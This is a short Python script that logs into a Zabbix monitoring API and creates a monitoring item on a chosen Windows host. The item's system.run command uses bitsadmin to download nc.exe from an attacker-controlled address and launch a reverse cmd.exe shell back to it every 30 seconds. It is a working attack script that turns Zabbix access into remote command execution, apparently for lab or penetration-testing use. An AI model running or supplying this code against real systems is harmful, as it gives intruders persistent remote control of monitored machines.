from pyzabbix import ZabbixAPI, ZabbixAPIException
import sys


api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
host_name=raw_input("enter hostname: \n")
# hostid=raw_input("enter hostid: \n")

zapi = ZabbixAPI(api_address) # user='Admin', password='zabbix')

# Login to the Zabbix API
zapi.login(user, password)

# host_name = 'Zabbix_server'

# host_name = "windows host"

hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"])
if hosts:
    host_id = hosts[0]["hostid"]
    print("Found host id {0}".format(host_id))

    try:
        item = zapi.item.create(
            hostid=host_id,
            name='netcat_create_reverse_shell',
            key_='system.run["bitsadmin.exe /transfer /download http://192.168.56.100/nc.exe C:\\Users\\Public\\nc.exe && C:\Users\\Public\\nc.exe 192.168.56.100 5555 -e cmd.exe"]',
            type=0,
            value_type=4,
            interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
            delay=30
        )
    except ZabbixAPIException as e:
        print(e)
        sys.exit()
    print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name))
else:
    print("No hosts found")
